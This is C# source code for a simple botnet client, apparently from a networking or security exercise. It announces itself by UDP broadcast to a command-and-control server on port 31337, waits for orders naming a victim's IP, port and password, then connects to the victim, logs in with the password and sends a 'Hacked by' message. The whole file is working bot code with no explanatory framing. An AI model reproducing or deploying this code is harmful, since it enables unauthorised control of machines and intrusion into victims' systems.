using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text;


namespace bot
{
    class Program
    {

        private static Socket CCcomm;
        private static Socket victimComm ;

        private static void init()
        {
            CCcomm = new Socket(SocketType.Dgram, ProtocolType.Udp);
            victimComm = new Socket(SocketType.Stream, ProtocolType.Tcp);
        }

        private static void botAnnounce()
        {
            IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());
            IPAddress myIP=null;
            foreach (IPAddress addr in localIPs)
            {
                if (addr.AddressFamily == AddressFamily.InterNetwork)
                {
                    myIP=addr;
                }
            }
            Random r = new Random();
            IPEndPoint e = new IPEndPoint(myIP, r.Next(1024,65535));
            CCcomm.Bind(e);
            int myPort = e.Port;
            Console.WriteLine("Bot is listening on port "+myPort);
            string announcement = "Destination IP: 255.255.255.255\nTransport protocol = UDP\nDestination port = 31337\nMessage contents: " + myPort;
            byte[] botAnnouneMessage = Encoding.ASCII.GetBytes(announcement);
            IPEndPoint CCserver = new IPEndPoint(IPAddress.Broadcast, 31337);
            while (true){
                CCcomm.SendTo(botAnnouneMessage, CCserver);
                Thread.Sleep(10000);
            }
        }

        private static void attackVictim(string ip, string port, string password, string CCName)
        {
            IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());
            IPAddress myIP = null;
            foreach (IPAddress addr in localIPs)
            {
                if (addr.AddressFamily == AddressFamily.InterNetwork)
                {
                    myIP = addr;
                }
            }
            Random r = new Random();
            IPEndPoint local = new IPEndPoint(myIP, r.Next(1024, 65535));
            victimComm.Bind(local);
            IPEndPoint victim = new IPEndPoint(IPAddress.Parse(ip), Int32.Parse(port));
            byte[] botAnnouncement = new byte[1024];
            EndPoint remote = victim;
            victimComm.Connect(victim);
            byte[] b = new byte[1024];
            victimComm.ReceiveFrom(b,ref remote);
            b = Encoding.ASCII.GetBytes(password+"\r\n");
            victimComm.SendTo(b, remote);
            b = new byte[1024];
            victimComm.ReceiveFrom(b, ref remote);
            if (victimComm.Connected)
            {
                b = Encoding.ASCII.GetBytes("Hacked by " + CCName+"\r\n");
                victimComm.SendTo(b, remote);
            }
        }

        private static void listenToCC()
        {
            Thread.Sleep(10000);
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);
            byte[] botActivate = new byte[1024];
            EndPoint remote = sender;
            while (true)
            {
                botActivate = new byte[1024];
                CCcomm.ReceiveFrom(botActivate, ref remote);
                string CCMessage = Encoding.ASCII.GetString(botActivate);
                string[] temp = CCMessage.Split(new string[] { "Message contents: " }, StringSplitOptions.None);
                string victimIP = temp[1].Split(new string[] { "," }, StringSplitOptions.None)[0];
                string victimPort = temp[1].Split(new string[] { "," }, StringSplitOptions.None)[1];
                string victimPassword = temp[1].Split(new string[] { "," }, StringSplitOptions.None)[2];
                string CCName = temp[1].Split(new string[] { "," }, StringSplitOptions.None)[3];
                Thread attackVictimT = new Thread(() =>attackVictim(victimIP, victimPort, victimPassword,CCName));
                attackVictimT.Start();
            }
        }

        static void Main(string[] args)
        {
            init();
            Thread announce = new Thread(new ThreadStart(botAnnounce));
            announce.Start();
            listenToCC();
        }
    }
}
